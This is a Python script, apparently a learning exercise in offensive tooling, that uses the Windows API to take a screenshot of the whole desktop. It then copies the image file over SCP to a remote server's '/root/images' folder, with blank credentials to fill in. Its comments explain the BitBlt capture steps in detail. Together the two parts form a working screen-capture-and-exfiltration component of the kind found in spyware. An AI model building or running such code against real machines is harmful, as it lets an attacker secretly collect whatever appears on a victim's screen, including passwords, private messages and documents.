import base64
import win32api
import win32con
import win32gui
import win32ui
from paramiko import SSHClient,AutoAddPolicy
from scp import SCPClient
import time

local_file = None

def get_dimensions():
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    
    # print("Width:{},Height:{},Left:{},Top:{}".format(width,height,left,top))
    
    return(width,height,left,top)

# SM_CXVIRTUALSCREEN: Total width of the virtual screen.
# SM_CYVIRTUALSCREEN: Total height of the virtual screen.
# SM_XVIRTUALSCREEN: Left-most coordinate (can be negative if you have a monitor to the left of the primary one).
# SM_YVIRTUALSCREEN: Top-most coordinate (usually 0 unless you have vertical stacking).



def screenshot():
    global local_file
    hdesktop = win32gui.GetDesktopWindow() #gets a handle that lets you interact with the pixels on the desktop
    width,height,left,top = get_dimensions()
    
    # OTHER WAY TO GET SCREEN DIMENSIONS
    #rect = win32gui.GetWindowRect(hdesktop)
    #left, top, right, bottom = rect
    #print("Width:{},Height:{},Left:{},Top:{}".format((right-left),(bottom-top),left,top))

    hdesktop = win32gui.GetDesktopWindow()    
    dc_desktop = win32gui.GetWindowDC(hdesktop)  
    ''' ----> retrieves a device context (DC) for the specified window (in this case, the desktop window i.e hdesktop).
    A device context is a structure that defines the graphics attributes (e.g., pen, brush, font) for drawing on a window or screen '''
    img_dc = win32ui.CreateDCFromHandle(dc_desktop) 
    '''---> takes the raw DC handle (dc_desktop) and wraps it into a PyCDC object (img_dc).
    PyCDC object is a Python class that provides methods for performing graphical operations (e.g., drawing, blitting, or capturing images) in a more Pythonic way compared to raw Windows API calls.'''
        
    mem_dc = img_dc.CreateCompatibleDC() #---> creates a compatible memory DC for off-screen drawing.
    
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc,width,height) #initializes the screenshot bitmap to be compatible with img_dc (the desktop’s DC) and sets its dimensions to width x height pixels.
    mem_dc.SelectObject(screenshot) #selects the screenshot bitmap into the memory DC (mem_dc).binds the bitmap to mem_dc, so graphical operations (e.g., BitBlt) on mem_dc will affect the screenshot bitmap’s pixel data.
    
    mem_dc.BitBlt((0,0),(width,height),img_dc,(left,top),win32con.SRCCOPY)
    ''' calls the Windows API BitBlt function to perform a bit-block transfer, copying a rectangular region of pixels from the source DC (img_dc, the desktop) to the destination DC (mem_dc, linked to screenshot).
        Parameters:
        (0, 0): Destination coordinates in mem_dc where the copied pixels will start (top-left corner of the bitmap).
        (width, height): Size of the rectangular region to copy (width and height of the bitmap).
        img_dc: Source DC (desktop’s DC, containing the screen’s pixels).
        (left, top): Source coordinates in img_dc where the copy starts (top-left corner of the screen region).
        win32con.SRCCOPY: Raster operation code, specifying a direct copy of pixels from source to destination.
    '''
    local_file = f"screenshot_{int(time.time())}.bmp"
    screenshot.SaveBitmapFile(mem_dc,f'{local_file}')
    
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())
    

if __name__ == '__main__':
    screenshot()

server = ""
username = ""
password = ""
remote_path = "/root/images"

ssh = SSHClient()
ssh.set_missing_host_key_policy(AutoAddPolicy())

try:
    ssh.connect(server,username=username,password=password)
    with SCPClient(ssh.get_transport()) as scp:
        scp.put(local_file,remote_path)
    print("Transferred")
except Exception as e:
    print("SCP failed: {}".format(e))
finally:
    ssh.close()
    

    
